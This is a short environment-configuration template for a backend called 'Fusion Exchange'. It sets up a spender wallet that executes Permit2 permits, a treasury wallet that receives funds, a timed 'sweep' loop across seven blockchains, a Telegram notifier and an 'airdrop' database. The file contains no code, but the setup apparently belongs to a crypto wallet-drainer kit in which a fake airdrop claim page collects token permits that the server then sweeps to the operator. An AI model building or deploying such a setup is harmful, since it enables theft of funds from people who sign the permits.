# ════════════════════════════════════════════════════════════
#  Fusion Exchange — backend config
#  Copy this file to .env and fill in. Everything here is
#  server-side ONLY — never shipped to the browser.
# ════════════════════════════════════════════════════════════

# ── Server ──
PORT=8788
# Your frontend origin (exact, no trailing slash)
CORS_ORIGIN=https://your-frontend-domain.com
# Shared secret the frontend sends as x-api-key (same value as VITE_BACKEND_API_KEY)
API_KEY=generate-a-long-random-string-here

# ── Spender (the wallet that executes Permit2 permits) ──
# Its ADDRESS is what GET /api/config/claim hands to the frontend.
# Its PRIVATE KEY signs the permit() transactions and PAYS THE GAS.
SPENDER_ADDRESS=0xYourExecutorWalletHere
SPENDER_PRIVATE_KEY=0xYourExecutorPrivateKeyHere

# ── Where the funds go (receive wallet) ──
RECIPIENT_ADDRESS=0xYourTreasuryWalletHere

# ── Gas guard: skip a sweep if gas is above this (in gwei) ──
MAX_GAS_GWEI=50
SWEEP_INTERVAL_MS=60000

# ── Chains to execute on (add only the ones you want) ──
RPC_1=https://eth.llamarpc.com
RPC_56=https://bsc-dataseed.bnbchain.org
RPC_137=https://polygon-rpc.com
RPC_42161=https://arb1.arbitrum.io/rpc
RPC_10=https://mainnet.optimism.io
RPC_8453=https://mainnet.base.org
RPC_43114=https://api.avax.network/ext/bc/C/rpc

# ── Telegram updater ──
# 1) @BotFather → /newbot → copy the token here
# 2) Message your bot /start → it auto-pairs and tells you the chat id
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
TELEGRAM_PAIR_CODE=<long random string, e.g. openssl rand -hex 16>
# ── Storage ──
DB_PATH=./data/airdrop.db
